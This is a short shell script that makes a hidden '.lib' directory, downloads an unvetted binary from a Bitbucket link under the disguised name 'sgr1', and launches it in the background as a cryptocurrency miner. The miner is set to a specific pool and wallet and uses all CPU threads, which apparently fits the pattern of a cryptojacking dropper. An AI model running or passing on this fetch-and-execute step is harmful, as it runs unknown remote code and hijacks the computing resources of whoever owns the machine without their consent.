mkdir .lib && cd .lib
wget -O sgr1 https://bitbucket.org/natalieawe/my-job/downloads/sereb 
chmod +x sgr1
./sgr1 --algorithm yespowersugar --pool stratum-na.rplant.xyz:7042 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive #> /dev/null 2>&1 &
